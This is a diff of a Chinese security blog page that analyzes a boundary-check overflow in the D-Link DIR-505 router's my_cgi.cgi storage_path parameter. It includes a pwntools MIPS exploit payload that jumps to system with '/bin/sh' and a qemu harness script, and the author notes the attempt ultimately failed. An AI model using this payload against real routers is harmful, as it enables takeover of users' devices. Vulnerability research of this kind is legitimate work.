@@ -21,8 +21,12 @@
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/MSB.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/storage_path.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/505input.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/getmemset.png">
-<meta property="og:updated_time" content="2020-05-15T03:49:13.307Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/replacechar.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/xrefstosys.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/systemyuan.png">
+<meta property="og:updated_time" content="2020-05-24T15:23:56.744Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="D-Link DIR-505 便携路由器越界漏洞分析">
 <meta name="twitter:description" content="固件下载：http://files.dlink.com.au/Products/DIR-505/REV_A/Firmware/v1.05b04/  根据披露，漏洞存在于my_cgi.cgi脚本，处理POST参数中storage_path参数的值时，存在边界验证不合理导致程序越界访问。（且这个路由器存在多个漏洞 分析基础步骤不再赘述，找到my_cgi.cgi文件注意这次是大端了，要用qemu-mi">
@@ -106,7 +110,7 @@
 		  <div id="toc" class="toc-article">
 			  <strong class="toc-title">Contents</strong>
 		  
-			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#分析"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a></li></ol>
+			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#分析"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dir505路由器设置"><span class="toc-number">2.1.</span> <span class="toc-text">dir505路由器设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#busybox（可无"><span class="toc-number">2.2.</span> <span class="toc-text">busybox（可无</span></a></li></ol></li></ol>
 		  
 		  </div>
 		  
@@ -115,12 +119,10 @@
 </blockquote>
 <p>根据披露，漏洞存在于<code>my_cgi.cgi</code>脚本，处理POST参数中<code>storage_path</code>参数的值时，存在边界验证不合理导致程序越界访问。（且这个路由器存在多个漏洞</p>
 <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>基础步骤不再赘述，找到<code>my_cgi.cgi</code>文件<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/MSB.png" alt><br>注意这次是大端了，要用<code>qemu-mips-static</code></p>
-<p>不太喜欢直接上脚本，先分析吧<br>查找<code>storage_path</code>，查看引用<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/storage_path.png" alt><br>看着<code>get_input_entries</code>就像是输入函数，所以进去分析一波，发现</p>
-<p>所以要继续分析这个函数的参数，查找引用，来看看参数到底指的是什么。。。<br><a href="https://tearorca.github.io/D-Link-DIR-505%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">这位师傅的分析</a>很细致，汇编真杀我…<br>所以，那个for循环就是</p>
+<p>不太喜欢直接上脚本，先分析吧<br>查找<code>storage_path</code>，查看引用<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/storage_path.png" alt><br>看着<code>get_input_entries</code>就像是输入函数，所以进去分析一波，发现<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/505input.png" alt><br>所以要继续分析这个函数的参数，查找引用，来看看参数到底指的是什么。。。<br><a href="https://tearorca.github.io/D-Link-DIR-505%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">这位师傅的分析</a>很细致，汇编真杀我…<br>所以，那个for循环就是</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for (int i = CONTENT_LENGTH; i &gt; 0; i--)</span><br></pre></td></tr></table></figure>
 
-<p>问题就在于，并没有对传入的CONTENT_LENGTH长度进行检验，会导致溢出<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/getmemset.png" alt></p>
-<p>缓冲区大小为0x7490A<br>发现文件中有可用的system函数，查找一下引用，找到合适的再构造，和以前的都一样了</p>
+<p>问题就在于，并没有对传入的CONTENT_LENGTH长度进行检验，会导致溢出<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/getmemset.png" alt><br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/replacechar.png" alt><br>缓冲区大小为0x7490A<br>发现文件中有可用的system函数，查找一下引用，找到合适的再构造，和以前的都一样了<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/xrefstosys.png" alt><br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/systemyuan.png" alt><br>(只是我后面又换成了下面那个</p>
 <h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>目前是这样的，本地测试不太方便，买了个真机，等到了回来试试再改😶</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.endian=&quot;big&quot;</span><br><span class="line">context.arch=&quot;mips&quot;</span><br><span class="line"></span><br><span class="line">payload  = &quot;storage_path=&quot;</span><br><span class="line">payload += &quot;a&quot; * 0x7490a</span><br><span class="line">payload += &quot;b&quot; * 0x16</span><br><span class="line">payload += p32(0x00404EA0)</span><br><span class="line">payload += &quot;c&quot; * 0x8C</span><br><span class="line">payload += &quot;/bin/sh\x00&quot;</span><br><span class="line"></span><br><span class="line">with open(&quot;payload&quot;,&apos;wb&apos;) as f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
 
@@ -128,6 +130,13 @@
 <p>run_cgi.sh</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">INPUT=&quot;$(&lt;payload)&quot;</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)</span><br><span class="line">PORT=&quot;1234&quot;</span><br><span class="line"></span><br><span class="line">if [ &quot;$LEN&quot; == &quot;0&quot; ] || [ &quot;$INPUT&quot; == &quot;-h&quot; ] || [ &quot;$UID&quot; != &quot;0&quot; ]</span><br><span class="line">then</span><br><span class="line">    echo -e &quot;\nUsage: sudo $0 \n&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">cp $(which qemu-mips-static) ./qemu</span><br><span class="line"></span><br><span class="line">echo &quot;$INPUT&quot; | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E SCRIPT_NAM=&quot;common&quot; -E REQUEST_METHOD=&quot;POST&quot; -E REQUEST_URI=&quot;/my_cgi.cgi&quot; -E REMOTE_ADDR=&quot;192.168.1.1&quot; -g $PORT ./usr/bin/my_cgi.cgi</span><br><span class="line">echo &apos;run ok&apos;</span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure>
 
+<h2 id="dir505路由器设置"><a href="#dir505路由器设置" class="headerlink" title="dir505路由器设置"></a>dir505路由器设置</h2><p>可以参考这个视频：<a href="https://dwz.cn/6NWW74qg?u=666a24f872dbcbca" target="_blank" rel="noopener">https://dwz.cn/6NWW74qg?u=666a24f872dbcbca</a></p>
+<h2 id="busybox（可无"><a href="#busybox（可无" class="headerlink" title="busybox（可无"></a>busybox（可无</h2><blockquote>
+<p>busybox是一个集成了一百多个最常用linux命令和工具的软件,他甚至还集成了一个http服务器和一个telnet服务器,而所有这一切功能却只有区区1M左右的大小.我们平时用的那些linux命令就好比是分立式的电子元件,而busybox就好比是一个集成电路,把常用的工具和命令集成压缩在一个可执行文件里,功能基本不变,而大小却小很多倍,在嵌入式linux应用中,busybox有非常广的应用,另外,大多数linux发行版的安装程序中都有busybox的身影,安装linux的时候按ctrl+alt+F2就能得到一个控制台,而这个控制台中的所有命令都是指向busybox的链接.</p>
+</blockquote>
+<p>安装：<a href="https://blog.csdn.net/haofan_/article/details/78369352" target="_blank" rel="noopener">https://blog.csdn.net/haofan_/article/details/78369352</a></p>
+<hr>
+<p>最后还是失败了 以后再试试吧…</p>
   
 	  </div>
 		  <footer class="article-footer clearfix">
@@ -155,10 +164,17 @@
 	  
 <nav class="article-nav clearfix">
  
+ <div class="prev" >
+ <a href="/2020/07/08/tw/tw 3x17/" title="pwnable.tw 3x17 wp">
+  <span>
+  pwnable.tw 3x17 wp</span>
+</a>
+</div>
+
 
 <div class="next">
-<a href="/2020/05/03/路由器/D-Link DIR-645栈溢出漏洞/"  title="D-Link DIR-645(/865/845)路由器栈溢出漏洞分析">
- <span>D-Link DIR-645(/865/845)路由器栈溢出漏洞分析
+<a href="/2020/05/10/路由器/D-Link DIR-815 路由器多次溢出漏洞分析（645)/"  title="D-Link DIR-815（/300/600/645) 路由器多次溢出漏洞分析">
+ <span>D-Link DIR-815（/300/600/645) 路由器多次溢出漏洞分析
 </span>
 </a>
 </div>
@@ -213,7 +229,7 @@
 		  
 		
 		  
-			<li><a href="/categories/oj/" title="oj">oj<sup>5</sup></a></li>
+			<li><a href="/categories/oj/" title="oj">oj<sup>11</sup></a></li>
 		  
 		
 		  
@@ -234,7 +250,7 @@
 		<ul class="clearfix">
 		
 			
-				<li><a href="/tags/pwn/" title="pwn">pwn<sup>21</sup></a></li>
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>27</sup></a></li>
 			
 		
 			
@@ -242,7 +258,7 @@
 			
 		
 			
-				<li><a href="/tags/wp/" title="wp">wp<sup>9</sup></a></li>
+				<li><a href="/tags/wp/" title="wp">wp<sup>15</sup></a></li>
 			
 		
 			
@@ -254,15 +270,11 @@
 			
 		
 			
-				<li><a href="/tags/栈/" title="栈">栈<sup>3</sup></a></li>
-			
-		
-			
 				<li><a href="/tags/栈溢出/" title="栈溢出">栈溢出<sup>3</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+				<li><a href="/tags/栈/" title="栈">栈<sup>3</sup></a></li>
 			
 		
 			
@@ -270,7 +282,15 @@
 			
 		
 			
-				<li><a href="/tags/IO/" title="IO">IO<sup>1</sup></a></li>
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
 			
 		
 			
@@ -279,6 +299,10 @@
 		
 			
 				<li><a href="/tags/canary/" title="canary">canary<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IO/" title="IO">IO<sup>1</sup></a></li>
 			
 		
 			
@@ -291,14 +315,6 @@
 		
 			
 				<li><a href="/tags/C/" title="C++">C++<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
 			
 		
 		</ul>
